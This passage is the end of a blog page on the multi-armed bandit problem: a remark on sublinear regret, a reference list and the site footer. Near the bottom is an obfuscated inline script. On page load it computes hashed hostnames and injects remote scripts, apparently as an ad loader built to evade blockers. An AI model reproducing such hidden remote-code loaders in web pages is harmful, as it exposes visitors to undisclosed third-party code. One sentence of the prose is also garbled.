    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.83333em;vertical-align: -0.15em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.00773em">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.280556em"><span class="" style="margin-left: -0.00773em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">→</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 0.64444em;vertical-align: 0em"></span><span class="mord">0</span></span></span></span></span> when time <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        t
       
       
        →
       
       
        ∞
       
      
      
       t to infty
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.61508em;vertical-align: 0em"></span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">→</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 0.43056em;vertical-align: 0em"></span><span class="mord">∞</span></span></span></span></span>. In this case, the learner will choose the optimal action almost all of the time as the horizon <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        t
       
      
      
       t
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.61508em;vertical-align: 0em"></span><span class="mord mathdefault">t</span></span></span></span></span> tends to infinity.</p> 
<p>In conclusion, after considering the choice of the optimal action, sublinear regret is the performance threshold is mainly due to its the influence on the optimal strategy.</p> 
<h2>
<a id="Reference_860"></a>Reference</h2> 
<blockquote> 
 <p>[1] <a href="https://imaddabbura.github.io/post/epsilon-greedy-algorithm/">epsilon-Greedy Algorithm</a></p> 
</blockquote> 
<blockquote> 
 <p>[2] <a href="https://lilianweng.github.io/lil-log/2018/01/23/the-multi-armed-bandit-problem-and-its-solutions.html#case-study">The Multi-Armed Bandit Problem and Its Solutions</a></p> 
</blockquote> 
<blockquote> 
 <p>[3] <a href="https://zlatankr.github.io/posts/2017/04/07/bayesian-ab-testing">Bayesian A/B testing with Thompson sampling</a></p> 
</blockquote> 
<blockquote> 
 <p>[4] <a href="https://www.jianshu.com/p/efb723420ee6">关于Multi-Armed Bandit（MAB）问题及算法</a></p> 
</blockquote> 
<blockquote> 
 <p>[5] Sandeep Pandey Deepayan Chakrabarti Deepak Agarwal “Multi-armed Bandit Problems with Dependent Arms”</p> 
</blockquote> 
<blockquote> 
 <p>[6] Tor Lattimore and Csaba Szepesvári “Bandit Algorithms”</p> 
</blockquote>
                </div>
                
                

		</div>
	</article>
</main>




			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程小白.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>